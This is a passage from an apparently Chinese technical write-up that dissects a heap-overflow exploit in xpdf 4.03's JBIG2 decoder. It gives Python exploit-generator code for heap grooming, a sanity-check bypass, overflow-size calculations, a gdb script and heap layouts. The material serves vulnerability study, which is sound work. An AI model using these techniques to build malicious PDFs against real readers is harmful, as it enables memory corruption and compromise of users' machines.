0x5555557bae40 —▸ 0x7ffff7ad9260 (main_arena+1728) ◂— 0x5555557bae40</span><br><span class="line">0x2600: 0x5555557b6aa0 —▸ 0x5555557c1110 —▸ 0x7ffff7ad92d0 (main_arena+1840) ◂— 0x5555557b6aa0</span><br><span class="line">0x2a00: 0x55555579af20 —▸ 0x7ffff7ad92f0 (main_arena+1872) ◂— 0x55555579af20</span><br><span class="line">0x3000: 0x5555557d3d80 —▸ 0x5555557d9b60 —▸ 0x5555557c88a0 —▸ 0x7ffff7ad9300 (main_arena+1888) ◂— 0x5555557d3d80</span><br></pre></td></tr></table></figure>

<p>这些碎片堆块对于接下来的堆风水是相当不利的，因此需要将其全部分配掉。这里使用的是 <code>PageInfoSeg</code> 来分配内存，因为通读代码可以发现 <code>JBIG2Stream::readPageInfoSeg</code> 函数<strong>除了分配一个堆块以外，没有产生其他任何影响</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def DummyAlloc(size):</span><br><span class="line">    return PageInfo(233, w&#x3D;8, h&#x3D;size)</span><br><span class="line"></span><br><span class="line">global_file &#x3D; [</span><br><span class="line">    SymbolDict(0, [Bitmap(1, 1)] * 0x10000),</span><br><span class="line">    SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow &#x2F;&#x2F; 8)),</span><br><span class="line">    SymbolDict(2, [Bitmap(1, 1)]),</span><br><span class="line">    # Heap grooming: eat every chunk in &#123;tcache,fast,small,large,unsorted&#125; bins</span><br><span class="line">    [[DummyAlloc(size)] * 128 for size in range(0x10, 0x1000, 0x10)],</span><br><span class="line">    [[DummyAlloc(size)] * 16 for size in range(0x1000, 0x10000, 0x100)],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>分配后的 bin 如下所示，可以看到清爽了不少：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x20 [corrupted]</span><br><span class="line">FD: 0x55555579d9f0 —▸ 0x5555557d2860 —▸ 0x555555798db0 —▸ 0x5555557d7fe0 —▸ 0x5555557d7c30 ◂— ...</span><br><span class="line">BK: 0x5555557f96e0 —▸ 0x5555557f9300 —▸ 0x5555557fb200 —▸ 0x5555557fdf40 —▸ 0x5555557fd390 ◂— ...</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>那么接下来的问题是，如何设计堆风水？exploit 给了一个清晰明了的做法：</p>
<blockquote>
<p>利用 global segment GList 满则扩增的特性创建堆空洞，进而让其他结构体来占据这些内存空洞，完成堆风水。</p>
</blockquote>
<p>什么意思呢？我们看看 GList 的一些类方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GList::GList() &#123;</span><br><span class="line">  size &#x3D; 8;</span><br><span class="line">  data &#x3D; (void **)gmallocn(size, sizeof(void*));</span><br><span class="line">  length &#x3D; 0;</span><br><span class="line">  inc &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void GList::append(void *p) &#123;</span><br><span class="line">  if (length &gt;&#x3D; size) &#123;</span><br><span class="line">    expand();</span><br><span class="line">  &#125;</span><br><span class="line">  data[length++] &#x3D; p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void GList::expand() &#123;</span><br><span class="line">  size +&#x3D; (inc &gt; 0) ? inc : size;</span><br><span class="line">  data &#x3D; (void **)greallocn(data, size, sizeof(void*));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，初始时 <strong>GList size 为 8</strong>。当 GList 中元素个数超过容量时，GList 容量将会<strong>双倍扩增</strong>。也就是说，初始时的 size 为 8，下次扩增后的 size 是 16，再下次扩增后的 size 为 32，再下下次的 size 为 64（单位，个指针）。</p>
<p>扩增所使用的堆函数为 <code>realloc</code>，即当 GList 容量扩增后，原先那个堆块<strong>将被释放</strong>。同时又因为上面已经将其余全部小堆块全都分配出去了，因此 <strong>GList 容量扩增所分配的新堆块，一定来自于 top chunk</strong>，这就能保证每次 GList 容量扩张时，<strong>新堆块的分配顺序一定是从低地址向高地址分配</strong>。</p>
<p>因此尝试让 global segment GList 多次扩展，从 8 扩展至我们所需要的最终大小 64：</p>
<blockquote>
<p>代码中的 glist_capacity == 32。个人认为这个数表示的是第几次 append global GList 时会扩充 GList size 至 64。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global_file &#x3D; [</span><br><span class="line">    SymbolDict(0, [Bitmap(1, 1)] * 0x10000),</span><br><span class="line">    SymbolDict(1, [Bitmap(1, 1)] * (size_to_overflow &#x2F;&#x2F; 8)),</span><br><span class="line">    SymbolDict(2, [Bitmap(1, 1)]),</span><br><span class="line">    # Heap grooming: eat every chunk in &#123;tcache,fast,small,large,unsorted&#125; bins</span><br><span class="line">    [[DummyAlloc(size)] * 128 for size in range(0x10, 0x1000, 0x10)],</span><br><span class="line">    [[DummyAlloc(size)] * 16 for size in range(0x1000, 0x10000, 0x100)],</span><br><span class="line">    # ------------ 开始尝试堆风水 ------------</span><br><span class="line">    [SymbolDict(i, []) for i in range(3, glist_capacity &#x2F;&#x2F; 2)],</span><br><span class="line">    # Now most bins are empty, except tcachebin 0x20, 0x50 and small bin 0x20</span><br><span class="line">    # This triggers GList::expand(), 0x80 -&gt; 0x100; allocates from top chunk</span><br><span class="line">    SymbolDict(glist_capacity &#x2F;&#x2F; 2, []),</span><br><span class="line">    [SymbolDict(i, []) for i in range(glist_capacity &#x2F;&#x2F; 2 + 1, glist_capacity)],</span><br><span class="line">    # 0x100 -&gt; 0x200, the old chunk should fall in tcache</span><br><span class="line">    SymbolDict(100, []),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>global segment 的堆风水执行结束后，其堆布局大致如下：</p>
<blockquote>
<p>注意 segNum 从 3 开始的 Symbol Dict，其结构体所分配的堆块（chunk size = 0x40）也是直接来自于 top chunk 。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; low address --------------------------------------------</span><br><span class="line">&#x2F;*</span><br><span class="line">    一些其他的堆块分配，包括</span><br><span class="line">    1. size&#x3D;8 的 global GList backing store</span><br><span class="line">    2. DummyAlloc</span><br><span class="line">    3. SymbolDict0、1、2</span><br><span class="line">    4. ...</span><br><span class="line">*&#x2F;</span><br><span class="line">SymbolDict3-8;</span><br><span class="line">size&#x3D;16 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict9-16;</span><br><span class="line">size&#x3D;32 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict17-32;</span><br><span class="line">size&#x3D;64 的 global GList backing store &#x2F;&#x2F; 最终的 GList data 堆位置，这里可不是堆空洞</span><br><span class="line">&#x2F;&#x2F; high address -------------------------------------------</span><br></pre></td></tr></table></figure>

<p>接下来，只需分别</p>
<ul>
<li>让 pageBitmap backing store 占据 size=16 的 Glist 堆空洞</li>
<li>让解析 TextRegion 时创建的 syms 指针数组占据 size=32 的 Glist 堆空洞</li>
</ul>
<p>即可完成堆布局。</p>
<blockquote>
<p>pageBitmap 的 JBIG2Bitmap 结构体堆位置在下文中将会说明。</p>
</blockquote>
<p>最后贴个 gdb script，可以使用该 gdbscript 辅助观察内存布局：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">file ..&#x2F;..&#x2F;xpdf-4.03&#x2F;build&#x2F;xpdf&#x2F;pdftohtml</span><br><span class="line">aslr off</span><br><span class="line">set follow-fork-mode parent</span><br><span class="line"></span><br><span class="line">b readSymbolDictSeg if segNum&#x3D;&#x3D;8</span><br><span class="line">commands</span><br><span class="line">    printf &quot;sakura in read symbol 8\n&quot;</span><br><span class="line"></span><br><span class="line">    printf &quot;globalSegments addr is:0x%llx\n&quot;, segments</span><br><span class="line">    printf &quot;segments GList backing buffer\n&quot;</span><br><span class="line">    p *(GList *)segments</span><br><span class="line">    # tcachebins</span><br><span class="line">    bins</span><br><span class="line">    # c</span><br><span class="line">end</span><br><span class="line">b readSymbolDictSeg if segNum&#x3D;&#x3D;16</span><br><span class="line">commands</span><br><span class="line">    printf &quot;sakura in read symbol 16\n&quot;</span><br><span class="line"></span><br><span class="line">    printf &quot;globalSegments addr is:0x%llx\n&quot;, segments</span><br><span class="line">    printf &quot;segments GList backing buffer\n&quot;</span><br><span class="line">    p *(GList *)segments</span><br><span class="line">    # tcachebins</span><br><span class="line">    bins</span><br><span class="line">    # c</span><br><span class="line">end</span><br><span class="line">b readSymbolDictSeg if segNum&#x3D;&#x3D;100</span><br><span class="line">commands</span><br><span class="line">    printf &quot;sakura in read symbol 32\n&quot;</span><br><span class="line"></span><br><span class="line">    printf &quot;globalSegments addr is:0x%llx\n&quot;, segments</span><br><span class="line">    printf &quot;segments GList backing buffer\n&quot;</span><br><span class="line">    p *(GList *)segments</span><br><span class="line">    # tcachebins</span><br><span class="line">    bins</span><br><span class="line"></span><br><span class="line">    tb JBIG2Stream.cc:1481</span><br><span class="line">    commands</span><br><span class="line">        printf &quot;after finish globalSegments addr is:0x%llx\n&quot;, segments</span><br><span class="line">        p *(GList *)segments</span><br><span class="line">        # tcachebins</span><br><span class="line">        bins</span><br><span class="line">    end</span><br><span class="line">    # replace finish and print info</span><br><span class="line">    # c</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">b JBIG2Stream.cc:2072 if segNum&#x3D;&#x3D;102</span><br><span class="line">commands</span><br><span class="line">    printf &quot;sakura in TextRegion to trigger oob\n&quot;</span><br><span class="line">    printf &quot;numSyms after underoverflow is:0x%llx\n&quot;, numSyms</span><br><span class="line">    set $oob_syms &#x3D; $rax</span><br><span class="line">    printf &quot;undersized syms buffer addr is:0x%llx\n&quot;, $oob_syms</span><br><span class="line"></span><br><span class="line">    printf &quot;globalSegments addr is:0x%llx\n&quot;, globalSegments</span><br><span class="line">    printf &quot;segments GList backing buffer\n&quot;</span><br><span class="line">    p *(GList *)globalSegments</span><br><span class="line"></span><br><span class="line">    printf &quot;pageBitmap addr is :0x%llx\n&quot;, pageBitmap</span><br><span class="line">    p *(JBIG2Bitmap *)pageBitmap</span><br><span class="line">    bins</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">r sploit.pdf output</span><br></pre></td></tr></table></figure>

<h3 id="b-占据堆空洞"><a href="#b-占据堆空洞" class="headerlink" title="b. 占据堆空洞"></a>b. 占据堆空洞</h3><p>global stream 中的解析操作是为了创建堆空洞，那 main stream 的解析操作就是为了占据堆空洞。</p>
<p>承接上文，接下来我们试着分配一个全新的 pageBitmap 结构，并让其 backing store 占据 size=16 的 Glist 空洞：</p>
<blockquote>
<p>代码中的 GLIST_DATA_SIZE = 0x200，表示 size=64 时 global glist data 占据的字节数。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">page0 &#x3D; [</span><br><span class="line">    # Make sure page bitmap buffer uses the second-last globalSegments data buffer so</span><br><span class="line">    # that it lies just before syms, at a fixed offset.</span><br><span class="line">    # GLIST_DATA_SIZE &#x2F;&#x2F; 4，表示占据 size&#x3D;16 时的 glist 堆空洞</span><br><span class="line">    PageInfo(101, w&#x3D;8 * (GLIST_DATA_SIZE &#x2F;&#x2F; 4), h&#x3D;1),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>此时堆布局如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; low address --------------------------------------------</span><br><span class="line">&#x2F;*</span><br><span class="line">    一些其他的堆块分配，包括</span><br><span class="line">    1. size&#x3D;8 的 global GList backing store</span><br><span class="line">    2. DummyAlloc</span><br><span class="line">    3. SymbolDict0、1、2</span><br><span class="line">    4. ...</span><br><span class="line">*&#x2F;</span><br><span class="line">SymbolDict3-8;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 注意这里！</span><br><span class="line">pageBitmap backing buffer &#x2F;&#x2F; size&#x3D;16 的 global GList backing store 堆空洞</span><br><span class="line"></span><br><span class="line">SymbolDict9-16;</span><br><span class="line"></span><br><span class="line">size&#x3D;32 的 global GList backing store 堆空洞</span><br><span class="line"></span><br><span class="line">SymbolDict17-32;</span><br><span class="line"></span><br><span class="line">size&#x3D;64 的 global GList backing store; &#x2F;&#x2F; 最终的 GList data 堆位置，这里可不是堆空洞</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 注意这里！</span><br><span class="line">pageBitmap JBIG2Bitmap; 结构体</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; high address -------------------------------------------</span><br></pre></td></tr></table></figure>

<p>这里简单说一下 pageBitmap <strong>结构本身的堆块分配(JBIG2Bitmap)</strong>，由于其 size 0x20 在堆链上找不到可分配的堆块，因此将<strong>仍然从 top chunk 中分配</strong>，故其地址位于 size=64 的 Glist 位置的<strong>高地址处</strong>，满足堆风水要求。</p>
<p>接下来需要在解析 TextRegion 时继续占用 size=32 的 Glist 堆空洞。因此 TextRegion 中创建的用户内存大小必须是 <code>syms_size = GLIST_DATA_SIZE // 2</code>，正好对应到 size=32 的 Glist 堆空洞大小。</p>
<p>但在做进一步的利用之前，我们需要绕过一个<a href="https://fossies.org/diffs/xpdf/4.02_vs_4.03/xpdf/JBIG2Stream.cc-diff.html" target="_blank" rel="noopener">比较有趣的 sanity check</a>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; sanity check: if the w&#x2F;h&#x2F;x&#x2F;y values are way out of range, it likely</span><br><span class="line">&#x2F;&#x2F; indicates a damaged JBIG2 stream</span><br><span class="line">if (w &#x2F; 10 &gt; pageW || h &#x2F; 10 &gt; pageH ||</span><br><span class="line">    x &#x2F; 10 &gt; pageW || y &#x2F; 10 &gt; pageH) &#123;</span><br><span class="line">    error(errSyntaxError, getPos(),</span><br><span class="line">          &quot;Bad size or position in JBIG2 text region segment&quot;);</span><br><span class="line">    done &#x3D; gTrue;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>xpdf-4.03/xpdf/JBIG2Stream.cc</code> 中多次出现上面的这种 sanity check，判断当前正在处理的 w是否越过了当前的 pageW 和 pageH（两个 JBIG2Stream 类的成员变量，用于表示当前 page 的宽度和高度），如果越界则说明当前解析过程可能存在问题，那么则立即停止解析当前 segment。</p>
<p>看上去好像这个 sanity check 没啥问题……</p>
<p>但实际上，我们回过头看看 <code>readPageInfoSeg</code> 函数的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">void JBIG2Stream::readPageInfoSeg(Guint length)</span><br><span class="line">&#123;</span><br><span class="line">    Guint xRes, yRes, flags, striping;</span><br><span class="line">    &#x2F;&#x2F; 从不受信任的流中直接读入 pageW 和 pageH</span><br><span class="line">    if (!readULong(&amp;pageW) || !readULong(&amp;pageH) ||</span><br><span class="line">        !readULong(&amp;xRes) || !readULong(&amp;yRes) ||</span><br><span class="line">        !readUByte(&amp;flags) || !readUWord(&amp;striping))</span><br><span class="line">    &#123;</span><br><span class="line">        goto eofError;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 如果 pageW 和 pageH 过大</span><br><span class="line">    if (pageW &#x3D;&#x3D; 0 || pageH &#x3D;&#x3D; 0 || pageW &gt; INT_MAX &#x2F; pageW)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; 则直接退出 pageInfoSeg 的解析</span><br><span class="line">        error(errSyntaxError, getPos(), &quot;Bad page size in JBIG2 stream&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以非常容易的发现， 即便 <code>readPageInfoSeg</code> 函数中检测到了 <code>pageW</code> 和 <code>pageH</code> 的异常，但也只是简单的退出掉当前 seg 的解析，<strong>保留了畸形 <code>pageW</code> 和 <code>pageH</code> 的值在 JBIG2Stream 类成员中</strong>。</p>
<p>这样，我们可以尝试插入一个超大 pageW 和 pageH 的 PageInfoSeg，从而污染这两个字段为超大值，bypass 后续所有新增加的 sanity check：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">page0 &#x3D; [</span><br><span class="line">    # Make sure page bitmap buffer uses the second-last globalSegments data buffer so</span><br><span class="line">    # that it lies just before syms, at a fixed offset.</span><br><span class="line">    PageInfo(101, w&#x3D;8 * (GLIST_DATA_SIZE &#x2F;&#x2F; 4), h&#x3D;1),</span><br><span class="line">    # Change pageH and pageW to a large value to bypass a (seriously funny) sanity</span><br><span class="line">    # check introduced in Xpdf 4.03; Xpdf would report an error without allocating</span><br><span class="line">    # a new pageBitmap, but won&#39;t stop parsing the JBIG2 stream, which is exactly what</span><br><span class="line">    # we want.</span><br><span class="line">    PageInfo(101, w&#x3D;1919114514, h&#x3D;1919114514),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>bypass 掉这个 sanity check 后，接下来就可以尝试创建 TextRegionSeg 来进行堆溢出了。承接上面所说的，这里所创建的 TextRegionSeg 需要满足几种要求：</p>
<ul>
<li>其内部创建的 syms 大小必须是 syms_size（这个值上面已经说明了）</li>
<li>向堆块写入的数据大小为 <code>size_to_overflow</code> 个字节，即实际写 <code>size_to_overflow // 8</code> 个指针</li>
</ul>
<p>因此接下来在 main stream 中，需要合理组合 TextRegion 所引用的 Symbol Dict 大小：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Trigger the out-of-bound write.</span><br><span class="line">TextRegion(</span><br><span class="line">    102,</span><br><span class="line">    w&#x3D;1,</span><br><span class="line">    h&#x3D;1,</span><br><span class="line">    x&#x3D;0,</span><br><span class="line">    y&#x3D;0,</span><br><span class="line">    # size_to_overflow &#x2F;&#x2F; 8 个指针</span><br><span class="line">    ref_segs&#x3D;[1]</span><br><span class="line">    # 0x10000 + (syms_size - size_to_overflow) &#x2F;&#x2F; 8 个指针</span><br><span class="line">    + [2] * (0x10000 + (syms_size - size_to_overflow) &#x2F;&#x2F; 8)</span><br><span class="line">    # 共 0xffff0000 个指针</span><br><span class="line">    + [0] * 0xFFFF,</span><br><span class="line">),</span><br></pre></td></tr></table></figure>

<p>上面代码的组合中，</p>
<p><em>size</em><em><em>to</em></em><em>overflow</em>/8 + {0<em>x</em>10000 + (<em>syms</em><em><em>size</em> − <em>size</em></em><em>to</em><em><em>overflow</em>)/8} + 0<em>xffff<em>0000 = 0</em>x*100000000 + *syms</em></em><em>size</em>/8，即刚好分配 syms_size 个字节。</p>
<p>又因为先 ref 的那个 Symbol Dict 的大小为 <code>size_to_overflow // 8</code> 个指针。因此当 readTextRegion 解析第一个 ref 的 Symbol Dict 时，刚好向 syms 堆块中写入 <code>size_to_overflow</code> 个字节，直接溢出至 pageBitmap JBIG2Bitmap 结构体头部位置，如此便能达到溢出的目的。</p>
<p>这里说明一下 size_to_overflow 是怎么得出的，先上堆布局：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; low address --------------------------------------------</span><br><span class="line">&#x2F;*</span><br><span class="line">    一些其他的堆块分配，包括</span><br><span class="line">    1. size&#x3D;8 的 global GList backing store</span><br><span class="line">    2. DummyAlloc</span><br><span class="line">    3. SymbolDict0、1、2</span><br><span class="line">    4. ...</span><br><span class="line">*&#x2F;</span><br><span class="line">SymbolDict3-8;</span><br><span class="line">pageBitmap backing buffer &#x2F;&#x2F; size&#x3D;16 的 global GList backing store 堆空洞</span><br><span class="line">SymbolDict9-16;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 从此处开始写入数据</span><br><span class="line">syms &#x2F;&#x2F; syms 的 size 为 syms_size</span><br><span class="line">SymbolDict17-32; &#x2F;&#x2F; 16 个 SymbolDict 的 size，一个 SymbolDict 的 size 为 0x40 字节</span><br><span class="line">size&#x3D;64 的 global GList backing store; &#x2F;&#x2F; 此时的 Glist size 为 GLIST_DATA_SIZE</span><br><span class="line">pageBitmap JBIG2Bitmap 结构体  &#x2F;&#x2F; 这里还需要覆写 vtble + segNum + w + h + line，共24字节</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; high address -------------------------------------------</span><br></pre></td></tr></table></figure>

<p>根据堆布局可得知：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">size_to_overflow &#x3D; (</span><br><span class="line">    ptmalloc_chunk_size(syms_size)</span><br><span class="line">    # 40: sizeof(JBIG2SymbolDict); there are (glist_capacity &#x2F;&#x2F; 2) irrelevant JBIG2SymbolDict-s</span><br><span class="line">    + ptmalloc_chunk_size(40) * (glist_capacity &#x2F;&#x2F; 2)</span><br><span class="line">    + ptmalloc_chunk_size(GLIST_DATA_SIZE)</span><br><span class="line">    # Current page JBIG2Bitmap</span><br><span class="line">    # vtbl(8)</span><br><span class="line">    + 8</span><br><span class="line">    # segNum(4), w(4), h(4), line(4)</span><br><span class="line">    + 4 * 4</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>之后，将 readTextRegionSeg 中刚刚被释放掉的那个 syms_size 大小的堆块再次分配回来，防止在后续的利用中出现可能的崩溃。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Take back the free-d syms, hold it to prevent potential crash.</span><br><span class="line">GenericRegion(103, imm&#x3D;False, bitmap&#x3D;Bitmap(8, syms_size)),</span><br></pre></td></tr></table></figure>

<p>由于越界写入 pageBitmap JBIG2Bitmap 结构体头部位置的是<strong>指针值</strong>，可以越界读写的数据有限，因此我们需要根据这个有限的 pageBitmap 越界读写原语，来自己修改自己的 JBIG2Bitmap 结构体头，将其中的 w修改的更大，扩展自己的读写范围。根据上面的堆布局，同样可以得出 <code>page_bitmap_buf</code> 至 <code>pageBitmap JBIG2Bitmap</code> 的距离：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">page_bitmap_buf_to_class_offset &#x3D; (</span><br><span class="line">    ptmalloc_chunk_size(GLIST_DATA_SIZE &#x2F;&#x2F; 4)</span><br><span class="line">    + ptmalloc_chunk_size(40) * (glist_capacity &#x2F;&#x2F; 4)</span><br><span class="line">    + size_to_overflow</span><br><span class="line">    - 4 * 4</span><br><span class="line">    - 8</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>之后将其 w分别更改为 <em>w</em> = 227、<em>h</em> = 224、<em>line</em> = 224：</p>
<blockquote>
<p>imm 为 true 表示即时渲染，即立即修改 pageBitmap 上的指定位置。</p>
</blockquote>
